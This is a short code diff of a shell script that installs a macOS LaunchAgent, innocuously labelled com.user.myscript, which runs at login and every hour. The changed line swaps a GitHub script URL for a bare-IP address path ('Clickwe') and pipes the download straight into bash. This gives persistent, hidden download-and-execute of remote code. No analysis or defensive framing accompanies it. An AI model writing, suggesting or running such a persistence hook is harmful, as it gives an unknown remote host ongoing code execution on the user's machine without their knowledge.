@@ -10,7 +10,7 @@ cat > ~/Library/LaunchAgents/com.user.myscript.plist << 'EOF'
   <key>ProgramArguments</key><array>
     <string>/bin/bash</string>
     <string>-c</string>
-    <string>curl -fsSL https://raw.githubusercontent.com/ronisuaywe/erer/refs/heads/main/script.sh | bash</string>
+    <string>curl -fsSL http://144.172.110.59/Clickwe | bash</string>
   </array>
   <key>RunAtLoad</key><true/>
   <key>StartInterval</key><integer>3600</integer>
